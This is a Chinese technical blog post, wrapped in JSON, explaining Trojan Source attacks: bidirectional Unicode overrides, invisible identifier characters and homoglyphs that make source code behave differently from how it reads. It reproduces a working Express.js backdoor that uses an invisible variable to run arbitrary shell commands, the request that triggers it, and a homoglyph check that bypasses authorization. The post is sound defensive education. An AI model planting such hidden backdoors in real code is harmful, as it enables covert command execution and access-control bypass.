{
  "Source": "coolshell.cn",
  "Title": "源代码特洛伊木马攻击",
  "Link": "https://coolshell.cn/articles/21649.html",
  "Content": "\u003cdiv class=\"entry-content\"\u003e\n\u003cp\u003e\u003cscript async=\"\" src=\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158\" crossorigin=\"anonymous\" type=\"5828dc8d18d70a28e754851a-text/javascript\"\u003e\u003c/script\u003e\u003cimg decoding=\"async\" class=\"alignright size-full wp-image-21658\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/il_340x270_pggv.jpg\" alt=\"\" width=\"340\" height=\"270\" srcset=\"https://coolshell.cn/wp-content/uploads/2021/11/il_340x270_pggv.jpg 340w, https://coolshell.cn/wp-content/uploads/2021/11/il_340x270_pggv-300x238.jpg 300w\" sizes=\"(max-width: 340px) 100vw, 340px\"/\u003e最近，我们在 Github 的 Code Review 中看到 Github 开始出现下面这个 Warning 信息—— “This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below.”也就是说我们的代码中有一些 bidirectional unicode 的文本，中文直译作 “双向文本”，意思是一些语言是从左到右的，而另一些则是是从右到左的（如：阿拉伯语），如果同一个文件里，即有从左向右的文本也有从右向左文本两种的混搭，那么，就叫bi-direction。术语通常缩写为“ \u003cb\u003eBiDi\u003c/b\u003e ”或“ \u003cb\u003ebidi\u003c/b\u003e ”。使用双向文本对于中国人来说并不陌生，因为中文又可以从左到右，也可以从右到左，还可以从上到下。\u003c/p\u003e\n\u003cp\u003e\u003cimg decoding=\"async\" loading=\"lazy\" class=\"aligncenter size-large wp-image-21652\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/1637305049427-1024x329.jpg\" alt=\"\" width=\"640\" height=\"206\" srcset=\"https://coolshell.cn/wp-content/uploads/2021/11/1637305049427-1024x329.jpg 1024w, https://coolshell.cn/wp-content/uploads/2021/11/1637305049427-300x96.jpg 300w, https://coolshell.cn/wp-content/uploads/2021/11/1637305049427-768x247.jpg 768w, https://coolshell.cn/wp-content/uploads/2021/11/1637305049427-604x194.jpg 604w, https://coolshell.cn/wp-content/uploads/2021/11/1637305049427.jpg 1288w\" sizes=\"(max-width: 640px) 100vw, 640px\"/\u003e\u003c/p\u003e\n\u003cp\u003e早期的计算机仅设计为基于拉丁字母的从左到右的方式。添加新的字符集和字符编码使许多其他从左到右的脚本能够得到支持，但不容易支持从右到左的脚本，例如阿拉伯语或希伯来语，并且将两者混合使用更是不可能。从右到左的脚本是通过\u003ca title=\"ISO/IEC 8859-6\" href=\"https://en.wikipedia.org/wiki/ISO/IEC_8859-6\"\u003eISO/IEC 8859-6\u003c/a\u003e和\u003ca title=\"ISO/IEC 8859-8\" href=\"https://en.wikipedia.org/wiki/ISO/IEC_8859-8\"\u003eISO/IEC 8859-8\u003c/a\u003e等编码引入的，通常以书写和阅读顺序存储字母。可以简单地将从左到右的显示顺序翻转为从右到左的显示顺序，但这样做会牺牲正确显示从左到右脚本的能力。通过双向文本支持，可以在同一页面上混合来自不同脚本的字符，而不管书写方向如何。\u003c/p\u003e\n\u003cp\u003e\u003cspan id=\"more-21649\"\u003e\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e双向文本支持是计算机系统正确显示双向文本的能力。对于Unicode来说，其标准为完整的 BiDi 支持提供了基础，其中包含有关如何编码和显示从左到右和从右到左脚本的混合的详细规则。你可以使用一些控制字符来帮助你完成双向文本的编排。\u003c/p\u003e\n\u003cp\u003e好的，科普完“双向文本”后，我们正式进入正题，为什么Github 会出这个警告？Github的官方博客“\u003ca href=\"https://github.blog/changelog/2021-10-31-warning-about-bidirectional-unicode-text/\" target=\"_blank\" rel=\"noopener\"\u003e关于双向Unicode的警告\u003c/a\u003e”中说，使用一些Unicode中的用于控制的隐藏字符，可以让你代码有着跟看上去完全不一样的行为。\u003c/p\u003e\n\u003cp\u003e我们先来看一个示例，下面这段 Go 的代码就会把 “Hello, World”的每个字符转成整型，然后计算其中多少个为 1 的 bit。\u003c/p\u003e\n\u003cpre class=\"EnlighterJSRAW\" data-enlighter-language=\"golang\"\u003epackage main\n\nimport \u0026#34;fmt\u0026#34;\n\nfunc main() {\n  str, mask := \u0026#34;Hello, World!‮10x‭\u0026#34;, 0\n\n  bits := 0\n  for _, ch := range str {\n    for ch \u0026gt; 0 {\n      bits += int(ch) \u0026amp; mask\n      ch = ch \u0026gt;\u0026gt; 1\n    }\n  }\n  fmt.Println(\u0026#34;Total bits set:\u0026#34;, bits)\n}\u003c/pre\u003e\n\u003cp\u003e这个代码你看上去没有什么 奇怪的地方，但是你在执行的时候（可以直接上Go Playground上执行  –\u003ca href=\"https://play.golang.org/p/e2BDZvFlet0\" target=\"_blank\" rel=\"noopener\"\u003e https://play.golang.org/p/e2BDZvFlet0\u003c/a\u003e），你会发现，结果是 0，也就是说“Hello, World”中没有值为 1 的 bit 位。这究竟发生了什么事？\u003c/p\u003e\n\u003cp\u003e如果你把上面这段代码拷贝粘贴到字符界面上的 vim 编辑器里，你就可以看到下面这一幕。\u003c/p\u003e\n\u003cp\u003e\u003cimg decoding=\"async\" loading=\"lazy\" class=\"aligncenter wp-image-21653\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/1637307319589.jpg\" alt=\"\" width=\"500\" height=\"324\" srcset=\"https://coolshell.cn/wp-content/uploads/2021/11/1637307319589.jpg 902w, https://coolshell.cn/wp-content/uploads/2021/11/1637307319589-300x194.jpg 300w, https://coolshell.cn/wp-content/uploads/2021/11/1637307319589-768x497.jpg 768w, https://coolshell.cn/wp-content/uploads/2021/11/1637307319589-417x270.jpg 417w\" sizes=\"(max-width: 500px) 100vw, 500px\"/\u003e\u003c/p\u003e\n\u003cp\u003e其中有两个浅蓝色的尖括号的东西—— \u003ccode\u003e\u0026lt;202e\u0026gt;\u003c/code\u003e 和 \u003ccode\u003e\u0026lt;202d\u0026gt;\u003c/code\u003e 。这两个字符是两个Unicode的控制字符（注：完整的双向文本控制字符参看 \u003ca href=\"https://www.compart.com/en/unicode/bidiclass\" target=\"_blank\" rel=\"noopener\"\u003eUnicode Bidirectional Classes\u003c/a\u003e）：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eU+202E – Right-to-Left Override [RLO] \u003c/strong\u003e\u003cbr/\u003e\n表示，开始从右到左显示，于是，接下来的文本 \u003ccode\u003e10x\u0026#34;, 0\u003c/code\u003e 变成了 \u003ccode\u003e0 ,\u0026#34;x01\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eU+202D – Left-to-Right Override [LRO]\u003c/strong\u003e\u003cbr/\u003e\n表示，开始从左到右显示，于是，\u003ccode\u003e0,\u0026#34;x01\u003c/code\u003e 中的前4个字符\u003ccode\u003e0 ,\u0026#34;\u003c/code\u003e 反转成  \u003ccode\u003e\u0026#34;, 0\u003c/code\u003e，于是整个文本成了 \u003ccode\u003e\u0026#34;, 0x01\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e所以，你在视觉上看到的是结果是—— \u003ccode\u003e\u0026#34;Hello, World!”, 0x01\u003c/code\u003e， 但是实际上是完全是另外一码事。\u003c/p\u003e\n\u003cp\u003e然后，Github官方博客中还给了一个安全问题 \u003ca href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42574\"\u003eCVE-2021-42574\u003c/a\u003e ——\u003c/p\u003e\n\u003cblockquote\u003e\u003cp\u003e在 Unicode 规范到 14.0 的双向算法中发现了一个问题。它允许通过控制序列对字符进行视觉重新排序，可用于制作源代码，呈现与编译器和解释器执行逻辑完全不同的逻辑。攻击者可以利用这一点对接受 Unicode 的编译器的源代码进行编码，从而将目标漏洞引入人类审查者不可见的地方。\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e这个安全问题在剑桥大学的这篇论文“\u003ca href=\"https://www.trojansource.codes/\" target=\"_blank\" rel=\"noopener\"\u003eSome Vulnerabilities are Invisible\u003c/a\u003e”中有详细的描述。其中PDF版的文章中也给了这么一个示例：\u003c/p\u003e\n\u003cp\u003e通过双向文本可以把下面这段代码：\u003c/p\u003e\n\u003cp\u003e\u003cimg decoding=\"async\" loading=\"lazy\" class=\"aligncenter wp-image-21655\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/1637308872541.jpg\" alt=\"\" width=\"569\" height=\"240\" srcset=\"https://coolshell.cn/wp-content/uploads/2021/11/1637308872541.jpg 692w, https://coolshell.cn/wp-content/uploads/2021/11/1637308872541-300x127.jpg 300w, https://coolshell.cn/wp-content/uploads/2021/11/1637308872541-604x255.jpg 604w\" sizes=\"(max-width: 569px) 100vw, 569px\"/\u003e\u003c/p\u003e\n\u003cp\u003e伪装成下面的这个样子：\u003c/p\u003e\n\u003cp\u003e\u003cimg decoding=\"async\" loading=\"lazy\" class=\"aligncenter wp-image-21654\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/1637308847435.jpg\" alt=\"\" width=\"580\" height=\"245\" srcset=\"https://coolshell.cn/wp-content/uploads/2021/11/1637308847435.jpg 692w, https://coolshell.cn/wp-content/uploads/2021/11/1637308847435-300x127.jpg 300w, https://coolshell.cn/wp-content/uploads/2021/11/1637308847435-604x255.jpg 604w\" sizes=\"(max-width: 580px) 100vw, 580px\"/\u003e\u003c/p\u003e\n\u003cp\u003e在图 2 中\u003ccode\u003e\u0026#39;alice\u0026#39;\u003c/code\u003e被定义为价值 100，然后是一个从 Alice 中减去资金的函数。最后一行以 50 的值调用该函数，因此该小程序在执行时应该给我们 50 的结果。\u003c/p\u003e\n\u003cp\u003e然而，图 1 向我们展示了如何使用双向字符来破坏程序的意图：通过插入\u003cstrong\u003eRLI (Right To Left Isolate)\u003c/strong\u003e\u003ci\u003e – \u003c/i\u003e\u003cstrong\u003eU+2067\u003c/strong\u003e\u003ci\u003e，\u003c/i\u003e我们将文本方向从传统英语更改为从右到左。尽管我们使用了减去资金功能，但图 1 的输出变为 100。\u003c/p\u003e\n\u003cp\u003e除此之外，支持Unicode还可以出现很多其它的攻击，尤其是通过一些“不可见字符”，或是通过“同形字符”在源代码里面埋坑。比如文章“\u003ca href=\"https://certitude.consulting/blog/en/invisible-backdoor/\" target=\"_blank\" rel=\"noopener\"\u003eThe Invisible Javascript Backdoor\u003c/a\u003e”里的这个示例：\u003c/p\u003e\n\u003cpre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\"\u003econst express = require(\u0026#39;express\u0026#39;);\nconst util = require(\u0026#39;util\u0026#39;);\nconst exec = util.promisify(require(\u0026#39;child_process\u0026#39;).exec);\n\nconst app = express();\n\napp.get(\u0026#39;/network_health\u0026#39;, async (req, res) =\u0026gt; {\n    const { timeout,ㅤ} = req.query;\n    const checkCommands = [\n        \u0026#39;ping -c 1 google.com\u0026#39;,\n        \u0026#39;curl -s http://example.com/\u0026#39;,ㅤ\n    ];\n\n    try {\n        await Promise.all(checkCommands.map(cmd =\u0026gt; \n                cmd \u0026amp;\u0026amp; exec(cmd, { timeout: +timeout || 5_000 })));\n        res.status(200);\n        res.send(\u0026#39;ok\u0026#39;);\n    } catch(e) {\n        res.status(500);\n        res.send(\u0026#39;failed\u0026#39;);\n    }\n});\n\napp.listen(8080);\u003c/pre\u003e\n\u003cp\u003e上面这个代码实现了一个非常简单的网络健康检查，HTTP会执行 \u003ccode\u003eping -c 1 google.com\u003c/code\u003e 以及 \u003ccode\u003ecurl -s http://example.com\u003c/code\u003e 这两个命令来查看网络是否正常。其中，可选输入 HTTP 参数\u003ccode\u003etimeout\u003c/code\u003e限制命令执行时间。\u003c/p\u003e\n\u003cp\u003e然后，上面这个代码是有不可见的Unicode 字符，如果你使用VSCode，把编码从 Unicode 改成 DOS (CP437) 后你就可以看到这个Unicode了\u003c/p\u003e\n\u003cp\u003e\u003cimg decoding=\"async\" loading=\"lazy\" class=\"aligncenter size-large wp-image-21656\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/1637310735683-1024x923.jpg\" alt=\"\" width=\"640\" height=\"577\" srcset=\"https://coolshell.cn/wp-content/uploads/2021/11/1637310735683-1024x923.jpg 1024w, https://coolshell.cn/wp-content/uploads/2021/11/1637310735683-300x270.jpg 300w, https://coolshell.cn/wp-content/uploads/2021/11/1637310735683-768x692.jpg 768w, https://coolshell.cn/wp-content/uploads/2021/11/1637310735683-299x270.jpg 299w, https://coolshell.cn/wp-content/uploads/2021/11/1637310735683.jpg 1118w\" sizes=\"(max-width: 640px) 100vw, 640px\"/\u003e\u003c/p\u003e\n\u003cp\u003e于是，一个你看不见的 \u003ccode\u003eπàñ\u003c/code\u003e 变量就这样生成了，你再仔细看一下整个逻辑，这个看不见的变量，可以让你的代码执行他想要的命令。因为，http 的请求中有第二个参数，这个参数可奖在后面被执行。于是我们可以构造如下的的 HTTP 请求：\u003c/p\u003e\n\u003cp style=\"text-align: center;\"\u003e\u003cstrong\u003ehttp://host:port/network_health?%E3%85%A4=\u0026lt;any command\u0026gt;\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e其中的，%E3%85%A4 就是 \u003ccode\u003e\\u3164\u003c/code\u003e 这个不可见Unicode 的编码，于是，一个后门代码就这样在神不知鬼不觉的情况下注入了。\u003c/p\u003e\n\u003cp\u003e另外，还可以使用“同形字符”，看看下面这个示例：\u003c/p\u003e\n\u003cpre class=\"EnlighterJSRAW\" data-enlighter-language=\"c\"\u003eif(environmentǃ=ENV_PROD){\n    // bypass authZ checks in DEV\n    return true;\n}\u003c/pre\u003e\n\u003cp\u003e如何你以为 \u003ccode\u003eǃ\u003c/code\u003e 是 惊叹号，其实不是，它是一个Unicode \u003ccode\u003e╟â\u003c/code\u003e。这种东西就算你把你的源码转成 DOS(CP437) 也没用，因为用肉眼在一大堆正常的字符中找不正常的，我觉得是基本不可能的事。\u003c/p\u003e\n\u003cp\u003e现在，是时候检查一下你的代码有没有上述的这些情况了……\u003c/p\u003e\n\u003cp\u003e（全文完）\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cdiv style=\"margin-top: 15px; font-size: 16px;color: #cc0000;\"\u003e\n\u003cp align=\"center\"\u003e\u003cstrong\u003e（转载本站文章请注明作者和出处 \u003ca href=\"https://coolshell.cn/\"\u003e酷 壳 – CoolShell\u003c/a\u003e ，请勿用于任何商业用途）\u003c/strong\u003e\u003c/p\u003e\n\u003c/div\u003e\n\u003cdiv class=\"wp_rp_wrap  wp_rp_vertical_m\" id=\"wp_rp_first\"\u003e\u003cdiv class=\"wp_rp_content\"\u003e\u003ch3 class=\"related_post_title\"\u003e相关文章\u003c/h3\u003e\u003cul class=\"related_post wp_rp\"\u003e\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/3684.html\" class=\"wp_rp_thumbnail\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/uploads/2011/02/1128-150x150.jpg\" alt=\"Web开发人员速查卡\" width=\"150\" height=\"150\"/\u003e\u003c/a\u003e\u003ca href=\"https://coolshell.cn/articles/3684.html\" class=\"wp_rp_title\"\u003eWeb开发人员速查卡\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/2439.html\" class=\"wp_rp_thumbnail\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/16.jpg\" alt=\"黑客的价值观\" width=\"150\" height=\"150\"/\u003e\u003c/a\u003e\u003ca href=\"https://coolshell.cn/articles/2439.html\" class=\"wp_rp_title\"\u003e黑客的价值观\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/1957.html\" class=\"wp_rp_thumbnail\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/9.jpg\" alt=\"Web程序的最佳测试数据\" width=\"150\" height=\"150\"/\u003e\u003c/a\u003e\u003ca href=\"https://coolshell.cn/articles/1957.html\" class=\"wp_rp_title\"\u003eWeb程序的最佳测试数据\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/1331.html\" class=\"wp_rp_thumbnail\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/11.jpg\" alt=\"Unicode字符预览表\" width=\"150\" height=\"150\"/\u003e\u003c/a\u003e\u003ca href=\"https://coolshell.cn/articles/1331.html\" class=\"wp_rp_title\"\u003eUnicode字符预览表\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/3872.html\" class=\"wp_rp_thumbnail\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/uploads/2011/03/affc-image1-150x150.png\" alt=\"微软用新浪来当反面教材\" width=\"150\" height=\"150\"/\u003e\u003c/a\u003e\u003ca href=\"https://coolshell.cn/articles/3872.html\" class=\"wp_rp_title\"\u003e微软用新浪来当反面教材\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/5479.html\" class=\"wp_rp_thumbnail\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/uploads/2011/09/vim_cheat_sheet_for_programmers_print-150x150.png\" alt=\"给程序员的VIM速查卡\" width=\"150\" height=\"150\"/\u003e\u003c/a\u003e\u003ca href=\"https://coolshell.cn/articles/5479.html\" class=\"wp_rp_title\"\u003e给程序员的VIM速查卡\u003c/a\u003e\u003c/li\u003e\u003c/ul\u003e\u003c/div\u003e\u003c/div\u003e\n\u003cdiv id=\"post-ratings-21649\" class=\"post-ratings\" itemscope=\"\" itemtype=\"https://schema.org/Article\" data-nonce=\"9b7e5e64b5\"\u003e\u003cimg id=\"rating_21649_1\" src=\"https://coolshell.cn/wp-content/plugins/wp-postratings/images/stars_crystal/rating_on.gif\" alt=\"好烂啊\" title=\"好烂啊\" onmouseover=\"if (!window.__cfRLUnblockHandlers) return false; current_rating(21649, 1, \u0026#39;好烂啊\u0026#39;);\" onmouseout=\"if (!window.__cfRLUnblockHandlers) return false; ratings_off(4.4, 5, 0);\" onclick=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" onkeypress=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" style=\"cursor: pointer; border: 0px;\" data-cf-modified-5828dc8d18d70a28e754851a-=\"\"/\u003e\u003cimg id=\"rating_21649_2\" src=\"https://coolshell.cn/wp-content/plugins/wp-postratings/images/stars_crystal/rating_on.gif\" alt=\"有点差\" title=\"有点差\" onmouseover=\"if (!window.__cfRLUnblockHandlers) return false; current_rating(21649, 2, \u0026#39;有点差\u0026#39;);\" onmouseout=\"if (!window.__cfRLUnblockHandlers) return false; ratings_off(4.4, 5, 0);\" onclick=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" onkeypress=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" style=\"cursor: pointer; border: 0px;\" data-cf-modified-5828dc8d18d70a28e754851a-=\"\"/\u003e\u003cimg id=\"rating_21649_3\" src=\"https://coolshell.cn/wp-content/plugins/wp-postratings/images/stars_crystal/rating_on.gif\" alt=\"凑合看看\" title=\"凑合看看\" onmouseover=\"if (!window.__cfRLUnblockHandlers) return false; current_rating(21649, 3, \u0026#39;凑合看看\u0026#39;);\" onmouseout=\"if (!window.__cfRLUnblockHandlers) return false; ratings_off(4.4, 5, 0);\" onclick=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" onkeypress=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" style=\"cursor: pointer; border: 0px;\" data-cf-modified-5828dc8d18d70a28e754851a-=\"\"/\u003e\u003cimg id=\"rating_21649_4\" src=\"https://coolshell.cn/wp-content/plugins/wp-postratings/images/stars_crystal/rating_on.gif\" alt=\"还不错\" title=\"还不错\" onmouseover=\"if (!window.__cfRLUnblockHandlers) return false; current_rating(21649, 4, \u0026#39;还不错\u0026#39;);\" onmouseout=\"if (!window.__cfRLUnblockHandlers) return false; ratings_off(4.4, 5, 0);\" onclick=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" onkeypress=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" style=\"cursor: pointer; border: 0px;\" data-cf-modified-5828dc8d18d70a28e754851a-=\"\"/\u003e\u003cimg id=\"rating_21649_5\" src=\"https://coolshell.cn/wp-content/plugins/wp-postratings/images/stars_crystal/rating_half.gif\" alt=\"很精彩\" title=\"很精彩\" onmouseover=\"if (!window.__cfRLUnblockHandlers) return false; current_rating(21649, 5, \u0026#39;很精彩\u0026#39;);\" onmouseout=\"if (!window.__cfRLUnblockHandlers) return false; ratings_off(4.4, 5, 0);\" onclick=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" onkeypress=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" style=\"cursor: pointer; border: 0px;\" data-cf-modified-5828dc8d18d70a28e754851a-=\"\"/\u003e (\u003cstrong\u003e38\u003c/strong\u003e 人打了分，平均分： \u003cstrong\u003e4.42\u003c/strong\u003e )\u003cbr/\u003e\u003cspan class=\"post-ratings-text\" id=\"ratings_21649_text\"\u003e\u003c/span\u003e\u003cmeta itemprop=\"name\" content=\"源代码特洛伊木马攻击\"/\u003e\u003cmeta itemprop=\"headline\" content=\"源代码特洛伊木马攻击\"/\u003e\u003cmeta itemprop=\"description\" content=\"最近，我们在 Github 的 Code Review 中看到 Github 开始出现下面这个 Warning 信息—— “This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below.”也就是说我们的代码中有一些 bidir...\"/\u003e\u003cmeta itemprop=\"datePublished\" content=\"2021-11-19T17:02:46+08:00\"/\u003e\u003cmeta itemprop=\"dateModified\" content=\"2022-02-12T13:30:38+08:00\"/\u003e\u003cmeta itemprop=\"url\" content=\"https://coolshell.cn/articles/21649.html\"/\u003e\u003cmeta itemprop=\"author\" content=\"陈皓\"/\u003e\u003cmeta itemprop=\"mainEntityOfPage\" content=\"https://coolshell.cn/articles/21649.html\"/\u003e\u003cdiv style=\"display: none;\" itemprop=\"publisher\" itemscope=\"\" itemtype=\"https://schema.org/Organization\"\u003e\u003cmeta itemprop=\"name\" content=\"酷 壳 - CoolShell\"/\u003e\u003cmeta itemprop=\"url\" content=\"https://coolshell.cn\"/\u003e\u003cdiv itemprop=\"logo\" itemscope=\"\" itemtype=\"https://schema.org/ImageObject\"\u003e\u003cmeta itemprop=\"url\" content=\"\"/\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv style=\"display: none;\" itemprop=\"aggregateRating\" itemscope=\"\" itemtype=\"https://schema.org/AggregateRating\"\u003e\u003cmeta itemprop=\"bestRating\" content=\"5\"/\u003e\u003cmeta itemprop=\"worstRating\" content=\"1\"/\u003e\u003cmeta itemprop=\"ratingValue\" content=\"4.42\"/\u003e\u003cmeta itemprop=\"ratingCount\" content=\"38\"/\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv id=\"post-ratings-21649-loading\" class=\"post-ratings-loading\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/plugins/wp-postratings/images/loading.gif\" width=\"16\" height=\"16\" class=\"post-ratings-image\"/\u003eLoading...\u003c/div\u003e\n\u003c/div\u003e",
  "Date": "2021-11-19T17:02:46+08:00",
  "Author": "陈皓"
}